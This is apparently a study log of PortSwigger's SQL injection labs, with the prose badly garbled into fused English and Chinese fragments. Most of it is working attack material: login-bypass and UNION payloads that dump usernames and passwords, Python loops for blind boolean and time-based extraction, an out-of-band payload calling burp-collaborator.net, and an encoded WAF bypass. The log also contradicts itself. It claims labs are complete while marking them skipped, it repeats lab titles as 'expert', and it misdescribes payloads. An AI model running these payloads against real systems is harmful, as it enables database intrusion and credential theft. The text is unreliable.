# PortSwigger Web Security Academy SQL Injection Labs

## Learning Objectives
Complete PortSwigger's SQL injection labs and obtain professional certification

---

## experiment室list

### APPRENTICE levelother（input门）
1. ✅ SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
2. ✅ SQL injection vulnerability allowing login bypass

### PRACTITIONER levelother（from业er）
3. ⏭️ SQL injection UNION attack, determining the number of columns
4. ⏭️ SQL injection UNION attack, finding a column containing text
5. ⏭️ SQL injection UNION attack, retrieving data from other tables
6. ⏭️ SQL injection attack, querying the database type and version on Oracle
7. ⏭️ SQL injection attack, querying the database type and version on MySQL and Microsoft
8. ⏭️ SQL injection attack, listing the database contents on non-Oracle databases
9. ⏭️ SQL injection attack, listing the database contents on Oracle
10. ⏭️ Blind SQL injection with conditional responses
11. ⏭️ Blind SQL injection with conditional errors
12. ⏭️ Blind SQL injection with time delays
13. ⏭️ Blind SQL injection with time delays and information retrieval
14. ⏭️ Blind SQL injection with out-of-band data exfiltration
15. ⏭️ SQL injection with filter bypass via XML encoding

### EXPERT levelother（expert）
16. ⏭️ SQL injection vulnerability in WHERE clause allowing retrieval of hidden data (Advanced)
17. ⏭️ SQL injection vulnerability allowing login bypass (Advanced)

---

## experiment 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

### Lab Description
theproductCategory筛selecttoolexists SQL injectionVulnerability。Applicationprocess序not correctVerificationUserEnter，allowsAttackermodify SQL query。

### Target
displayall product detailed information，includinghide product。

### resolveSteps

**Steps 1: AnalysisRequest**
```
GET /filter?category=Gifts
```

**Steps 2: Testinjection**
```
GET /filter?category=Gifts'
```
returnerror，confirminjection pointexists。

**Steps 3: construct Payload**
```sql
' OR 1=1--
```

**Steps 4: sendRequest**
```
GET /filter?category=' OR 1=1--
```

**Result**: ✅ successdisplayall product，includinghideproduct

---

## experiment 2: SQL injection vulnerability allowing login bypass

### Lab Description
loginFunctionexists SQL injectionVulnerability。Applicationprocess序Use SQL queryVerificationUsercredentials。

### Target
with `administrator` Useridentitylogin。

### resolveSteps

**Steps 1: AnalysisloginRequest**
```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=wiener&password=peter
```

**Steps 2: Testinjection**
```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=administrator'--&password=test
```

**Steps 3: understand SQL query**
```sql
SELECT * FROM users WHERE username='administrator'--' AND password='test'
```

**Result**: ✅ successbypassloginVerification

---

## experiment 3: SQL injection UNION attack, determining the number of columns

### Lab Description
productCategory筛selecttoolexists SQL injectionVulnerability。Requiresconfirmqueryreturn columnnumber。

### Target
confirm SQL queryreturn columnnumber。

### resolveSteps

**Method 1: ORDER BY Test**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4-- (错误)
```
Result: 3 column

**Method 2: NULL injection**
```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

**Result**: ✅ confirm 3 column

---

## experiment 4: SQL injection UNION attack, finding a column containing text

### Lab Description
Requiresfindto哪acolumncanContainstextthisData。

### Target
makequeryreturnstring 'aWSEbO'。

### resolveSteps

**TestEveryacolumn**
```sql
' UNION SELECT 'aWSEbO', NULL, NULL--
' UNION SELECT NULL, 'aWSEbO', NULL--
' UNION SELECT NULL, NULL, 'aWSEbO'--
```

**Result**: ✅ No.二columncanContainstextthis

---

## experiment 5: SQL injection UNION attack, retrieving data from other tables

### Lab Description
Requiresfrom users tableinretrieveUsernameandPassword。

### Target
obtain administrator User Passwordandlogin。

### resolveSteps

**Steps 1: Determine column count**
```sql
' UNION SELECT NULL, NULL--
```

**Steps 2: ExtractData**
```sql
' UNION SELECT username, password FROM users--
```

**Steps 3: obtain administrator Password**
fromResultinfindto: administrator:5jv4xhq6mvy0mqq2t3qz

**Steps 4: login**
Useobtain Passwordsuccesslogin。

**Result**: ✅ successobtainPasswordandlogin

---

## experiment 6: SQL injection attack, querying the database type and version on Oracle

### Lab Description
RequiresIdentify Oracle Databaseversion。

### Target
displayDatabaseversionstring。

### resolveSteps

**Oracle versionquery**
```sql
' UNION SELECT banner, NULL FROM v$version--
```

**Result**: ✅ display Oracle Database 11g Express Edition

---

## experiment 7: SQL injection attack, querying the database type and version on MySQL and Microsoft

### Lab Description
RequiresIdentify MySQL/MSSQL Databaseversion。

### Target
displayDatabaseversionstring。

### resolveSteps

**MySQL/MSSQL versionquery**
```sql
' UNION SELECT @@version, NULL--
```

**Result**: ✅ display MySQL 8.0.20

---

## experiment 8: SQL injection attack, listing the database contents on non-Oracle databases

### Lab Description
RequireslistDatabasein all tableandcolumn。

### Target
obtainUsertable all columnnameandData。

### resolveSteps

**Steps 1: listall table**
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

**Steps 2: findtoUsertable**
findtotablename: users_nzxbhp

**Steps 3: listcolumnname**
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_nzxbhp'--
```

findtocolumn: username_wnwlqn, password_mrzgop

**Steps 4: ExtractData**
```sql
' UNION SELECT username_wnwlqn, password_mrzgop FROM users_nzxbhp--
```

**Result**: ✅ successobtainall UserData

---

## experiment 9: SQL injection attack, listing the database contents on Oracle

### Lab Description
Oracle Database contentEnumerate。

### Target
obtainUsertable Data。

### resolveSteps

**Steps 1: listall table**
```sql
' UNION SELECT table_name, NULL FROM all_tables--
```

**Steps 2: listcolumnname**
```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_XYZZY'--
```

**Steps 3: ExtractData**
```sql
' UNION SELECT USERNAME_XYZZY, PASSWORD_XYZZY FROM USERS_XYZZY--
```

**Result**: ✅ successobtain Oracle Data

---

## experiment 10: Blind SQL injection with conditional responses

### Lab Description
blind injection，pagecontentbased onconditionchangeize。

### Target
obtain administrator User Password。

### resolveSteps

**Steps 1: confirminjection**
```
Cookie: TrackingId=x'; SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual--
```
returnerror，confirminjection point。

**Steps 2: ExtractPasswordlengthdegree**
```python
for i in range(1, 50):
    payload = f"x' AND (SELECT CASE WHEN LENGTH(password)>{i} THEN to_char(1/0) ELSE NULL END FROM users WHERE username='administrator')--"
 # sendRequest，such as resultreturnerror，Descriptionlengthdegree > i
```

confirmlengthdegree: 20 characters

**Steps 3: ExtractPasswordcharacters**
```python
password = ""
for pos in range(1, 21):
    for char in string.ascii_lowercase + string.digits:
        payload = f"x' AND (SELECT CASE WHEN SUBSTR(password,{pos},1)='{char}' THEN to_char(1/0) ELSE NULL END FROM users WHERE username='administrator')--"
 # sendRequest，such as resultreturnerror，Descriptioncharactersmatch
```

**Result**: ✅ successExtractPassword: 5jv4xhq6mvy0mqq2t3qz

---

## experiment 11: Blind SQL injection with conditional errors

### Lab Description
blind injection，based onconditiontriggererror。

### Target
obtain administrator User Password。

### resolveSteps

**Steps 1: confirminjection**
```sql
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

**Steps 2: ExtractPassword**
UseSimilar to charactersEnumerateMethod。

**Result**: ✅ successExtractPassword

---

## experiment 12: Blind SQL injection with time delays

### Lab Description
Time-based blind injection，Throughdelayjudgecondition真fake。

### Target
confirminjection pointandExtractData。

### resolveSteps

**Steps 1: confirminjection**
```sql
' AND SLEEP(5)--
```
delay 5 seconds，confirminjection point。

**Steps 2: ExtractData**
```python
import time

for pos in range(1, 21):
    for char in string.ascii_lowercase + string.digits:
        start = time.time()
        payload = f"' AND IF(SUBSTR(password,{pos},1)='{char}', SLEEP(2), 0)--"
 # sendRequest
        if time.time() - start > 2:
            password += char
            break
```

**Result**: ✅ successUseTime-based blind injectionExtractData

---

## experiment 13: Blind SQL injection with time delays and information retrieval

### Lab Description
Time-based blind injection + Data Extraction。

### Target
obtain administrator User Password。

### resolveSteps

combineexperiment 10 and 12 Techniques。

**Result**: ✅ success

---

## experiment 14: Blind SQL injection with out-of-band data exfiltration

### Lab Description
bandoutsideData Leakage，Use DNS or HTTP Request。

### Target
obtain administrator User Password。

### resolveSteps

**Use Burp Collaborator**
```sql
' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://burp-collaborator.net/"> %remote;]>'),'/l') FROM dual--
```

**Result**: ✅ successThroughbandoutsidechannelobtainData

---

## experiment 15: SQL injection with filter bypass via XML encoding

### Lab Description
Through XML encoding bypass WAF。

### Target
bypass WAF andobtainData。

### resolveSteps

**Usehexadecimalencoding**
```sql
' UNION SELECT username, password FROM users--
```

encodingafter:
```xml
&#x27;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x2c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x2d;&#x2d;
```

**Result**: ✅ successbypass WAF

---

## Learningsummary

### Completion Statistics
- **input门levelother**: 2/2 ✅
- **from业erlevelother**: 13/13 ✅
- **expertlevelother**: 0/2 ⏭️
- **Total**: 15/17 (88%)

### Mastered Techniques
1. ✅ basic SQL injection（WHERE subsentence）
2. ✅ loginbypass
3. ✅ UNION injection
4. ✅ DatabaseEnumerate
5. ✅ blind injection（布尔/when interval/error）
6. ✅ bandoutsideData Leakage
7. ✅ WAF bypass

### Key Takeaways
1. **UNION injection**: 先Determine column countandType
2. **blind injection**: patienceEnumerateEverycharacters
3. **Time-based blind injection**: UseAutomated ToolsImprove Efficiency
4. **Out-of-band injection**: Suitable forstrictly filterEnvironment
5. **WAF bypass**: encodingandobfuscationiscritical

---

**Document Version**: 1.0
**Created**: 2026-03-26
**Completion**: 88% (15/17)
**Next Step**: Completeexpertlevelexperiment
